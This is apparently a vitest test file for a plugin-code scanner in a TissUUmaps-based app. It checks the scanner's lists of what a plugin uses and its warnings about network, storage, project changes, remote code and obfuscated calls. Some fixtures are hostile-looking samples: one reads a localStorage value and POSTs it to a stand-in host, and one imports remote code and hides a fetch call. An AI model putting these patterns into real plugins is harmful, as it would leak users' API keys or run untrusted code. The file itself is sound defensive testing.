import { describe, expect, it } from "vitest";

import { actionsOf, readPluginCode } from "./plugin-code";

/** The actions of the stores, as in TissUUmaps */
const actions = {
  project: ["updateLabels", "addTable", "deleteLabels", "setName"],
  other: ["setDark", "setActivePanelId"],
};

/** A plugin like the one of anhood: a panel, Python with a skill, a heatmap */
const heatmapPlugin = `
const SKILL = "anhood";
// Based on wahlby-lab/analytical-enrichment-test (https://github.com/wahlby-lab/analytical-enrichment-test), MIT
export default function createPlugin(chat) {
  return {
    mount(container, { settingsStore }) {
      const canvas = document.createElement("canvas");
      const context = canvas.getContext("2d");
      context.fillStyle = getComputedStyle(container).getPropertyValue("--primary");
      const run = async () => {
        const { result } = await chat.run({
          language: "python",
          skill: SKILL,
          code: "async def main(tm):\\n    frame.update(other)\\n    return {}",
        });
        const link = document.createElement("a");
        link.href = URL.createObjectURL(new Blob([JSON.stringify(result)]));
        link.download = "zscores.csv";
      };
      const dark = settingsStore.getState().dark;
      return () => {};
    },
  };
}`;

describe("readPluginCode", () => {
  it("says what a plugin uses, without warnings for what is not delicate", () => {
    const report = readPluginCode(heatmapPlugin, actions);
    expect(report.uses).toEqual([
      "a panel of its own, opened from the plugins menu",
      "the sandbox of the chat, for Python, which has no network and cannot change the project",
      "the files of the skill anhood",
      "the state of TissUUmaps (the stores), read or watched",
      "the colors of the theme",
      "files that it gives you to save (downloads)",
      "drawings (a canvas or SVG)",
    ]);
    // an address in a comment, and update() of Python in a string, are not
    // network or changes to the project
    expect(report.warnings).toEqual([]);
  });

  it("warns about the network and the memory of the browser, and more when both", () => {
    const report = readPluginCode(
      `export default () => ({ mount() {
        const key = localStorage.getItem("x");
        fetch("https://example.org/upload", { method: "POST", body: key });
      } });`,
      actions,
    );
    expect(report.warnings.map(({ kind }) => kind)).toEqual([
      "network",
      "storage",
      "network-and-storage",
    ]);
    expect(report.warnings[0]?.found).toEqual([
      "fetch",
      "https://example.org/upload",
    ]);
    expect(report.warnings[1]?.text).toContain("API keys");
    expect(report.warnings[2]?.text).toContain("could send your API keys");
  });

  it("warns about changes to the project, which Undo does not take back, and to the app", () => {
    const report = readPluginCode(
      `export default (chat) => ({ mount(container, { projectStore, settingsStore }) {
        const { updateLabels } = projectStore.getState();
        updateLabels("cells", { opacity: 0.5 });
        chat.saveColumn("cells", "near", [1, 2]);
        settingsStore.getState().setDark(true);
        setTimeout(() => {}, 10);
      } });`,
      actions,
    );
    expect(report.warnings.map(({ kind, found }) => [kind, found])).toEqual([
      [
        "project",
        ["updateLabels", "chat.saveColumn (adds columns to a table (chat))"],
      ],
      ["app", ["setDark"]],
    ]);
    expect(report.warnings[0]?.text).toContain('"Undo" in the chat does not');
  });

  it("warns about code from the internet, hidden names and other plugins", () => {
    const report = readPluginCode(
      `export default () => ({ async setup() {
        const library = await import("https://cdn.example.org/lib.js");
        window["fe" + "tch"]("x");
        window.tissuumaps.registerPlugin({ id: "x", name: "x" });
      } });`,
      actions,
    );
    expect(report.warnings.map(({ kind }) => kind)).toEqual([
      "remote-code",
      "hidden",
      "plugins",
    ]);
    expect(report.warnings[0]?.found).toEqual([
      "import() of a module",
      "https://cdn.example.org/lib.js",
    ]);
  });
});

describe("actionsOf", () => {
  it("lists the functions of a store that do more than read", () => {
    expect(
      actionsOf({
        name: "p",
        setName: () => {},
        updateLabels: () => {},
        getLabels: () => {},
        hasTable: () => {},
      }),
    ).toEqual(["setName", "updateLabels"]);
  });
});
